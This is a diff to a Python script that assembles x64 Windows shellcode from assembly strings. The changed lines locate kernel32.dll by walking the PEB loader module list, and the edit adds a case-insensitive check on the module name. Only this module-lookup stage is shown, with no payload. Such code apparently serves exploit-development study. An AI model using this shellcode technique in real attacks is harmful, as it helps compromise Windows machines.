@@ -13,7 +13,7 @@ def main():
         
         " find_kernel32:                    "   # start to find kernel32 library
         "   xor rcx, rcx                    ;"  # Zero RCX contents
-        "   mov rsi, gs:[rcx+0x60]          ;"  # 0x060 load PEB to RAX
+        "   mov rsi, gs:[rcx+0x60]          ;"  # 0x060 load PEB to RSI
         "   mov rsi, [rsi+0x18]             ;"  # 0x18 load PEB.Ldr Offset
         "   mov rsi, [rsi+0x20]             ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
         
@@ -24,14 +24,21 @@ def main():
         "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
         "   jne next_module                 ;"  # If not, keep looking
         
-        " check_kernel32:                   "
+        " confirm_kernel32:                 "
         "   mov cl, 0x6c                    ;"  # Lowercase 'l'
         "   mov dl, [rdi+0xb*2]             ;"  # Move second last char to DL
+        "   cmp dl, 0x61                    ;"  # Check if current char is lowercase
+        "   jl to_lower                     ;"  # If uppercase, convert to lower
+        "   jmp compare_char                ;"  # If lowercase, jump to compare the char
+        
+        " to_lower:                         "   # Convert current char to lowercase
         "   sub dl, 0x41                    ;"  # current char - hex(ord('A'))
         "   add dl, 0x61                    ;"  # above result + hex(ord('a')) = lowercase char
-        "   cmp dl, cl                      ;"  # Check if current char is 'l' (0x6c), address the problem when the 'exe' name is 12 characters long, being really LAZY here!
+        
+        " compare_char:                     "   # Compare second last char to 'l'
+        "   cmp dl, cl                      ;"  # Check if current char is 'l' (0x6c), address the problem when the 'exe' name is 12 characters long
         "   jne next_module                 ;"  # If the character before NULL is not 'l', then we found a module which has a name of 12 chars but not a dll, keep looking
-         
+        
         " get_find_function_ret:            "
         "   jmp find_function_short         ;"  # A short jump to call function backwards
         
@@ -327,3 +334,4 @@ def main():
  
 if __name__ == "__main__":
     main()
+
